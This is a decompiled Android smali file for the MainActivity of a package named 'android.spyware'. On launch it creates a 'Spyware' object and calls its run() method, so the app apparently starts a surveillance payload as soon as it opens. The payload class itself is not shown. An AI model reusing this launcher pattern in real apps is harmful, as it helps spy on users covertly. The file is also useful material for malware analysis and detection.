.class public Landroid/spyware/MainActivity;
.super Landroid/support/v7/app/AppCompatActivity;
.source "MainActivity.java"


# direct methods
.method public constructor <init>()V
    .registers 1

    .prologue
    .line 6
    invoke-direct {p0}, Landroid/support/v7/app/AppCompatActivity;-><init>()V

    return-void
.end method


# virtual methods
.method protected onCreate(Landroid/os/Bundle;)V
    .registers 4
    .param p1, "savedInstanceState"    # Landroid/os/Bundle;

    .prologue
    .line 10
    invoke-super {p0, p1}, Landroid/support/v7/app/AppCompatActivity;->onCreate(Landroid/os/Bundle;)V

    .line 11
    const v1, 0x7f04001a

    invoke-virtual {p0, v1}, Landroid/spyware/MainActivity;->setContentView(I)V

    .line 12
    new-instance v0, Landroid/spyware/Spyware;

    invoke-virtual {p0}, Landroid/spyware/MainActivity;->getApplication()Landroid/app/Application;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/spyware/Spyware;-><init>(Landroid/content/Context;)V

    .line 13
    .local v0, "launcher":Landroid/spyware/Spyware;
    invoke-virtual {v0}, Landroid/spyware/Spyware;->run()V

    .line 14
    return-void
.end method
